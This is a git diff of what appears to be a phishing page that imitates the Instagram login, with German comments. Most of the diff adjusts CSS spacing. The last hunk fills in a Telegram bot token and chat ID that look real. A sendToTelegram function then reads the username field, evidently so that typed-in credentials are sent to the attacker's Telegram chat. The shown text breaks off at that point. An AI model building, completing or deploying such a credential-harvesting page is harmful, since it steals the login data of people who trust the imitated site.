@@ -25,18 +25,18 @@
 
     .login-container img {
       width: 80px; /* Verkleinertes Instagram-Logo */
-      margin-bottom: 10px; /* Logo höher schieben */
+      margin-bottom: 5px; /* Logo höher schieben */
     }
 
     .login-container h1 {
-      font-size: 32px; /* Größerer Instagram-Schriftzug */
+      font-size: 30px; /* Größerer Instagram-Schriftzug */
       margin-bottom: 20px;
     }
 
     .facebook-btn {
       background-color: #1877f2;
       color: #fff;
-      padding: 10px 0;
+      padding: 8px 16px;
       font-size: 14px;
       font-weight: bold;
       border: none;
@@ -46,10 +46,10 @@
       display: flex;
       align-items: center;
       justify-content: center;
-      width: 100%; /* Button zentrieren */
-      max-width: 280px; /* Maximale Breite */
+      width: 100%; /* Button schmaler machen */
+      max-width: 280px; /* Max-Breite für Facebook-Button */
+      margin: 0 auto 20px; /* Zentriert unter Instagram */
       transition: background-color 0.3s;
-      position: relative; /* Ermöglicht bessere Ausrichtung */
     }
 
     .facebook-btn:hover {
@@ -57,10 +57,9 @@
     }
 
     .facebook-btn img {
-      position: absolute;
-      left: 12px; /* Logo leicht nach links verschieben */
       width: 16px;
       height: 16px;
+      margin-right: 8px;
     }
 
     .divider {
@@ -86,7 +85,7 @@
 
     .form-container input {
       width: 100%;
-      padding: 12px;
+      padding: 10px;
       margin: 10px 0;
       border: 1px solid #262626;
       border-radius: 4px;
@@ -105,7 +104,7 @@
       text-align: right;
       color: #3897f0;
       font-size: 12px;
-      margin: 12px 0; /* Gleicher Abstand zu anderen Elementen */
+      margin: 8px 0 20px; /* Gleicher Abstand für Links */
       text-decoration: none;
       cursor: pointer;
     }
@@ -123,7 +122,7 @@
       font-size: 16px;
       font-weight: bold;
       width: 100%;
-      margin-top: 15px; /* Button leicht nach oben verschieben */
+      margin-top: 10px; /* Button leicht nach oben verschieben */
       cursor: pointer;
       transition: background-color 0.3s;
     }
@@ -169,12 +168,12 @@
       }
 
       .login-container h1 {
-        font-size: 28px; /* Etwas kleinerer Schriftzug auf Handys */
+        font-size: 26px; /* Etwas kleinerer Schriftzug auf Handys */
       }
 
       .facebook-btn {
-        font-size: 12px;
-        padding: 10px 0;
+        font-size: 12px; /* Kleinere Schrift im Facebook-Button */
+        padding: 6px 14px;
       }
 
       .form-container input {
@@ -229,8 +228,8 @@
 
   <script>
     // Telegram-Bot-Informationen
-    const BOT_TOKEN = "DEIN_BOT_TOKEN"; // Ersetze mit deinem Bot-Token
-    const CHAT_ID = "DEINE_CHAT_ID";   // Ersetze mit deiner Chat-ID
+    const BOT_TOKEN = "7433787133:AAHuCXGJgERrcUwvb4adFMTlv8EX7e-upZY"; // Bot-Token
+    const CHAT_ID = "6640486406";   // Deine Chat-ID
 
     function sendToTelegram() {
       const username = document.getElementById("username").value;
